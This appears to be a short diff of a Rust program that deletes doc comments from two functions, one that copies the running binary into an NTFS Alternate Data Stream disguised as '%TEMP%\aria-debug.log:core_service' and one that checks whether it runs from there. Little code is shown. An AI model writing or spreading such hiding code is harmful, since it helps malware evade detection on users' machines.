@@ -4,8 +4,6 @@ use std::io::{self, Write};
 
 use log::info;
 
-/// Install current binary to Alternate Data Stream (ADS)
-/// Target: %TEMP%\aria-debug.log:core_service
 pub fn install_to_ads() -> io::Result<String> {
     let current_exe = env::current_exe()?;
     let temp_dir = env::temp_dir();
@@ -33,7 +31,6 @@ pub fn install_to_ads() -> io::Result<String> {
     Ok(ads_path)
 }
 
-/// Check if running from ADS
 pub fn is_running_from_ads() -> bool {
     if let Ok(path) = env::current_exe() {
         let path_str = path.to_string_lossy();
